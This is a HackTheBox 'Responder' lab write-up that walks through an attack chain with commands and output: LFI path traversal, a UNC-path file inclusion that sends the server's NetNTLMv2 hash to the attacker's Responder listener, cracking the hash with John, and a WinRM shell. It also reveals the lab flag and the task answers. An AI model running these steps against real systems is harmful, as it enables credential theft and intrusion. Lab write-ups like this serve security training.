# Responder — HackTheBox Starting Point Writeup

![Platform](https://img.shields.io/badge/Platform-HackTheBox-9FEF00?logo=hackthebox&logoColor=black)
![Tier](https://img.shields.io/badge/Tier-1-red)
![OS](https://img.shields.io/badge/OS-Windows-blue?logo=windows&logoColor=white)
![Flags](https://img.shields.io/badge/Flags-1-orange)
![Foothold](https://img.shields.io/badge/Foothold-LFI%2FRFI%20%E2%86%92%20NetNTLMv2%20%E2%86%92%20WinRM-red)

> **Target:** `10.129.85.209`  ·  **Host:** `unika.htb`
> **Foothold:** A PHP `page=` parameter allows **file inclusion**. Point it at a UNC path on our host, capture the **NetNTLMv2** hash with **Responder**, crack it, and log in over **WinRM**.

---

## 🧭 Overview

Responder runs a PHP site (XAMPP/Apache) with a language switcher: `index.php?page=<file>`.
The parameter includes files with no sanitisation — **Local File Inclusion** (reading
`windows\system32\drivers\etc\hosts`) and, because PHP on Windows resolves **UNC paths**,
**Remote File Inclusion** over SMB. Pointing `page=` at `\\<our-ip>\share` makes the server
authenticate to our **Responder** listener, leaking the **Administrator** NetNTLMv2 hash.
It cracks to `badminton`; those creds give a **WinRM** shell, and the flag is on **mike's**
desktop.

---

## 1. Reconnaissance

```bash
nmap -p80,5985 -sV 10.129.85.209
```

```text
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)   # WinRM
```

> A plain `nmap -sC -sV` only caught 5985 (high latency → 999 ports "filtered"). Always
> re-scan suspected ports explicitly — port **80** was there all along.

The site redirects to **`unika.htb`**, so map it in `/etc/hosts`:

```bash
echo "10.129.85.209 unika.htb" | sudo tee -a /etc/hosts
```

---

## 2. Local File Inclusion

The language switcher uses `?page=`. Test it by reading a known Windows file:

```bash
curl "http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts"
```

The Windows hosts file comes back → **LFI confirmed**.

---

## 3. Remote File Inclusion → Capture NetNTLMv2

PHP on Windows will follow a **UNC path**, so pointing `page=` at our machine forces an
SMB auth we can capture.

**Start Responder** on the VPN interface:

```bash
sudo responder -I tun0
# Responder IP [10.10.17.110] ... Listening for events...
```

**Trigger the callback** (second terminal):

```bash
curl "http://unika.htb/index.php?page=//10.10.17.110/share"
```

Responder captures the hash:

```text
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:65a6bf7603892805:AD5266...
```

---

## 4. Crack the Hash

Save the **single** hash line to `hash.txt` (only the `Administrator::...` line — not the
whole Responder output, or the cracker throws `Separator unmatched` / `Token length exception`).

```bash
john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

```text
badminton        (Administrator)
```

> Hashcat equivalent is `-m 5600`. On a low-RAM box hashcat may error
> *"Not enough allocatable device memory"* — John is a reliable fallback.

---

## 5. Shell — WinRM

WinRM is on `5985`; use the cracked creds with evil-winrm:

```bash
evil-winrm -i 10.129.85.209 -u administrator -p badminton
```

The flag is on **mike's** desktop, not the Administrator's:

```powershell
*Evil-WinRM* PS C:\Users\Administrator> cd C:\Users\mike\Desktop
*Evil-WinRM* PS C:\Users\mike\Desktop> cat flag.txt
```

---

## 6. Flag

<details>
<summary>🚩 Click to reveal — FLAG</summary>

```text
ea81b7afddd03efaa0945333ed147fac
```
</details>

---

## 📝 Task Questions & Answers

<details>
<summary>📋 Click to reveal — guided task answers</summary>

| # | Question | Answer |
|---|----------|--------|
| 1 | When visiting the web service, what domain does the IP redirect to? | unika.htb |
| 2 | Which scripting language is used to generate the web pages? | PHP |
| 3 | Which URL parameter is used to load different language versions? | page |
| 4 | Which LFI payload reads the Windows hosts file? | ../../../../../../../../windows/system32/drivers/etc/hosts |
| 5 | Which RFI value points the include at our own machine? | //10.10.14.x/somefile |
| 6 | What does NTLM stand for? | New Technology LAN Manager |
| 7 | Which Responder flag specifies the network interface? | -I |
| 8 | What is the full name of the tool `john`? | John the Ripper |
| 9 | What is the cracked Administrator password? | badminton |
| 10 | What TCP port is the Windows remote-management service on? | 5985 |
| 11 | On which user's desktop is the flag? | mike |
| 12 | Submit flag | `ea81b7afddd03efaa0945333ed147fac` |

</details>

---

## 🛡️ Lessons / Remediation
- **Never pass user input to `include()`** — whitelist allowed pages; disable
  `allow_url_include` and UNC/stream wrappers.
- **Block outbound SMB (445)** so the host can't authenticate to attacker machines.
- **Use long, random passwords** — `badminton` dies instantly to a wordlist.
- Prefer NTLMv2 hardening / SMB signing and disable legacy auth where possible.
